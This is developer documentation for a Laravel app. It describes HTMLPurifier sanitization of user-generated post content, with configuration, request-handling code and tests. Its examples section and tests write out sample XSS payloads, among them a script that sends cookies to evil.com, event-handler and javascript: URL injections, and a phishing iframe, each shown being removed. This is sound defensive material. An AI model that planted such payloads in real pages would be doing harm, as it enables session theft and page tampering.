# HTML Sanitization for User-Generated Content

## Overview

This document describes the HTML sanitization implementation used to protect the application from XSS (Cross-Site Scripting) attacks and other security vulnerabilities when handling user-generated rich text content.

## Why Sanitization is Needed

When users create content with rich text editors (like CKEditor), they generate HTML that is stored in the database and later displayed to other users. Without sanitization, malicious users could:

- Inject JavaScript code via `<script>` tags
- Use event handlers (e.g., `onclick`, `onload`) to execute malicious code
- Embed dangerous external content via `<iframe>`, `<object>`, or `<embed>` tags
- Create phishing forms or capture user input
- Perform XSS (Cross-Site Scripting) attacks

## Implementation

### Technology Stack

- **Library**: [mews/purifier](https://github.com/mewebstudio/Purifier) (Laravel wrapper)
- **Core**: [HTMLPurifier](http://htmlpurifier.org/) by Edward Z. Yang
- **Version**: ^3.4 (wrapper), ^4.18 (core)

### Installation

The HTML Purifier package is already installed via Composer:

```bash
composer require mews/purifier
```

### Configuration

Configuration file: `config/purifier.php`

```php
'post_content' => [
    'HTML.Doctype' => 'HTML 4.01 Transitional',
    'HTML.Allowed' => 'h1,h2,h3,p,br,strong,em,b,i,a[href|title|target|rel],ul,ol,li,blockquote',
    'HTML.ForbiddenElements' => 'script,style,iframe,object,embed,form,input,button',
    'HTML.ForbiddenAttributes' => 'onclick,onload,onerror,onmouseover,onsubmit,onfocus,onblur',
    'CSS.AllowedProperties' => '',
    'AutoFormat.AutoParagraph' => false,
    'AutoFormat.RemoveEmpty' => false,
    'Attr.AllowedFrameTargets' => ['_blank'],
    'URI.AllowedSchemes' => ['http' => true, 'https' => true, 'mailto' => true],
    'URI.DisableExternalResources' => false,
],
```

### Allowed HTML Elements

The following HTML tags are permitted in post content:

| Category | Tags | Purpose |
|----------|------|---------|
| **Headings** | `h1`, `h2`, `h3` | Document structure |
| **Text Formatting** | `strong`, `em`, `b`, `i` | Bold, italic, emphasis |
| **Paragraphs** | `p`, `br` | Text blocks and line breaks |
| **Links** | `a` | Hyperlinks with href, title, target, rel attributes |
| **Lists** | `ul`, `ol`, `li` | Ordered and unordered lists |
| **Quotes** | `blockquote` | Quoted text |

### Forbidden HTML Elements

These elements are **automatically removed** during sanitization:

| Category | Tags | Reason |
|----------|------|--------|
| **Scripts** | `script`, `style` | Can execute malicious JavaScript |
| **Embeds** | `iframe`, `object`, `embed` | Can load external malicious content |
| **Forms** | `form`, `input`, `button` | Can be used for phishing |
| **Media** | `video`, `audio`, `canvas` | Potential security risks |

### Forbidden Attributes

These attributes are **stripped from all elements**:

- **Event Handlers**: `onclick`, `onload`, `onerror`, `onmouseover`, `onsubmit`, `onfocus`, `onblur`, etc.
- **Inline Styles**: CSS styles are disabled (`CSS.AllowedProperties` is empty)
- **JavaScript URLs**: `href="javascript:..."` is blocked

### Allowed URL Schemes

Only these URL schemes are permitted in links:

- ✅ `http://` - Standard web links
- ✅ `https://` - Secure web links
- ✅ `mailto:` - Email links
- ❌ `javascript:` - Blocked
- ❌ `data:` - Blocked
- ❌ `file:` - Blocked

## Usage in Application

### Backend Implementation

Sanitization occurs in Laravel FormRequest classes before validation:

**StorePostRequest.php:**
```php
<?php

namespace App\Http\Requests;

use Illuminate\Foundation\Http\FormRequest;
use Mews\Purifier\Facades\Purifier;

class StorePostRequest extends FormRequest
{
    protected function prepareForValidation(): void
    {
        if ($this->has('body') && !empty($this->body)) {
            $this->merge([
                'body' => Purifier::clean($this->body, 'post_content'),
                'user_id' => auth()->id()
            ]);
        } else {
            $this->merge([
                'user_id' => auth()->id()
            ]);
        }
    }
}
```

**UpdatePostRequest.php:**
```php
<?php

namespace App\Http\Requests;

use Illuminate\Foundation\Http\FormRequest;
use Mews\Purifier\Facades\Purifier;

class UpdatePostRequest extends FormRequest
{
    protected function prepareForValidation(): void
    {
        if ($this->has('body') && !empty($this->body)) {
            $this->merge([
                'body' => Purifier::clean($this->body, 'post_content'),
            ]);
        }
    }
}
```

### Data Flow

1. **User Input**: User creates/edits post with CKEditor
2. **Form Submission**: HTML content sent to backend via Inertia
3. **Sanitization**: `prepareForValidation()` runs `Purifier::clean()`
4. **Validation**: Cleaned HTML passes through validation rules
5. **Storage**: Safe HTML stored in database
6. **Display**: Content rendered with `v-html` in Vue components

## Security Examples

### Example 1: Script Injection Prevention

**User Input:**
```html
<h2>My Post</h2>
<script>
  // Steal cookies
  fetch('https://evil.com?cookie=' + document.cookie);
</script>
<p>This is my content.</p>
```

**After Sanitization:**
```html
<h2>My Post</h2>
<p>This is my content.</p>
```

The `<script>` tag is completely removed.

### Example 2: Event Handler Removal

**User Input:**
```html
<a href="https://example.com" onclick="alert('XSS!')">Click me</a>
<img src="x" onerror="maliciousCode()">
```

**After Sanitization:**
```html
<a href="https://example.com">Click me</a>
```

Event handlers are stripped, and the invalid `<img>` tag is removed.

### Example 3: JavaScript URL Blocking

**User Input:**
```html
<a href="javascript:void(document.body.innerHTML='Hacked!')">Malicious Link</a>
```

**After Sanitization:**
```html
<a>Malicious Link</a>
```

The `javascript:` URL is removed, making the link harmless.

### Example 4: Iframe Embedding Prevention

**User Input:**
```html
<p>Check this out:</p>
<iframe src="https://phishing-site.com"></iframe>
```

**After Sanitization:**
```html
<p>Check this out:</p>
```

The `<iframe>` tag is completely removed.

### Example 5: Safe Formatting Preserved

**User Input:**
```html
<h2>Title</h2>
<p>This is <strong>bold</strong> and <em>italic</em> text.</p>
<ul>
  <li>Item 1</li>
  <li>Item 2</li>
</ul>
<blockquote>A quote</blockquote>
<a href="https://example.com" target="_blank" rel="noopener">Safe Link</a>
```

**After Sanitization:**
```html
<h2>Title</h2>
<p>This is <strong>bold</strong> and <em>italic</em> text.</p>
<ul>
  <li>Item 1</li>
  <li>Item 2</li>
</ul>
<blockquote>A quote</blockquote>
<a href="https://example.com" target="_blank" rel="noopener">Safe Link</a>
```

All safe formatting is preserved exactly as intended.

## Performance Considerations

### Caching

HTMLPurifier caches its configuration to improve performance:

- **Cache Directory**: `storage/app/purifier/`
- **Cache Mode**: 0755
- **Auto-generated**: Cache files are created automatically
- **Cleaning**: Clear cache with: `rm -rf storage/app/purifier/*`

### Performance Tips

1. **Purifier is Fast**: HTMLPurifier is highly optimized for production use
2. **Cache Enabled**: Configuration caching reduces overhead
3. **One-time Processing**: Sanitization happens only once when saving, not when displaying
4. **No Frontend Overhead**: Sanitization is server-side only

## Testing Sanitization

### Manual Testing

You can test sanitization in Tinker:

```bash
php artisan tinker
```

```php
use Mews\Purifier\Facades\Purifier;

// Test malicious input
$malicious = '<script>alert("XSS")</script><p>Safe text</p>';
$cleaned = Purifier::clean($malicious, 'post_content');
echo $cleaned; // Output: <p>Safe text</p>

// Test with event handlers
$dangerous = '<a href="#" onclick="hack()">Click</a>';
$cleaned = Purifier::clean($dangerous, 'post_content');
echo $cleaned; // Output: <a href="#">Click</a>
```

### Unit Testing

Create tests in `tests/Feature/PostSanitizationTest.php`:

```php
<?php

namespace Tests\Feature;

use Tests\TestCase;
use App\Models\User;
use App\Models\Post;

class PostSanitizationTest extends TestCase
{
    public function test_script_tags_are_removed()
    {
        $user = User::factory()->create();
        
        $response = $this->actingAs($user)->post(route('post.store'), [
            'body' => '<script>alert("XSS")</script><p>Safe content</p>',
        ]);
        
        $this->assertDatabaseHas('posts', [
            'user_id' => $user->id,
            'body' => '<p>Safe content</p>',
        ]);
    }
    
    public function test_event_handlers_are_stripped()
    {
        $user = User::factory()->create();
        
        $response = $this->actingAs($user)->post(route('post.store'), [
            'body' => '<a href="#" onclick="malicious()">Link</a>',
        ]);
        
        $post = Post::where('user_id', $user->id)->first();
        $this->assertStringNotContainsString('onclick', $post->body);
    }
}
```

## Configuration Options

### Customizing Allowed Tags

To allow additional tags, edit `config/purifier.php`:

```php
'HTML.Allowed' => 'h1,h2,h3,h4,p,br,strong,em,b,i,a[href|title],ul,ol,li,blockquote,code,pre',
```

### Allowing Images

To enable images (with security considerations):

```php
'HTML.Allowed' => '...,img[src|alt|title|width|height]',
'URI.AllowedSchemes' => ['http' => true, 'https' => true, 'data' => true],
```

⚠️ **Warning**: Allowing `data:` URIs can enable SVG-based XSS attacks. Use with caution.

### Enabling CSS Classes

To allow specific CSS classes:

```php
'Attr.AllowedClasses' => 'text-center,text-bold,highlight',
```

## Security Best Practices

1. ✅ **Never trust user input** - Always sanitize HTML content
2. ✅ **Sanitize on the backend** - Client-side validation can be bypassed
3. ✅ **Use whitelist approach** - Only allow known-safe tags/attributes
4. ✅ **Keep library updated** - Regularly update HTMLPurifier
5. ✅ **Test regularly** - Verify sanitization with security tests
6. ✅ **Log suspicious attempts** - Monitor for attack patterns
7. ✅ **Use Content Security Policy** - Add CSP headers for defense-in-depth

## Troubleshooting

### Content Being Over-Sanitized

**Issue**: Legitimate content is being removed.

**Solution**: Check the `HTML.Allowed` configuration and add the necessary tags.

### Links Not Working

**Issue**: All links are being stripped.

**Solution**: Ensure `a[href]` is in the `HTML.Allowed` configuration.

### Performance Issues

**Issue**: Sanitization is slow.

**Solution**: 
- Ensure cache directory exists and is writable
- Clear purifier cache: `rm -rf storage/app/purifier/*`
- Check cache permissions: `chmod -R 755 storage/app/purifier/`

## Related Documentation

- [CKEditor Integration](./CKEDITOR_INTEGRATION.md) - Rich text editor setup
- [HTMLPurifier Documentation](http://htmlpurifier.org/docs) - Official docs
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) - Security guidelines

## Files Modified

1. **Created**: `config/purifier.php` - Sanitization configuration
2. **Modified**: `app/Http/Requests/StorePostRequest.php` - Added sanitization on create
3. **Modified**: `app/Http/Requests/UpdatePostRequest.php` - Added sanitization on update
4. **Created**: `storage/app/purifier/` - Cache directory

## Dependencies

- `mews/purifier: ^3.4` - Laravel wrapper for HTMLPurifier
- `ezyang/htmlpurifier: ^4.18` - Core sanitization library

## Maintenance

### Regular Updates

Keep the sanitization library updated:

```bash
composer update mews/purifier
```

### Cache Management

Clear cache when updating configuration:

```bash
rm -rf storage/app/purifier/*
```

Or add to deployment scripts:

```bash
php artisan cache:clear
rm -rf storage/app/purifier/*
```

## Conclusion

HTML sanitization is a critical security measure that protects users from XSS attacks and other vulnerabilities. By implementing HTMLPurifier with a strict whitelist approach, we ensure that user-generated content is safe to display while preserving the intended formatting and functionality.
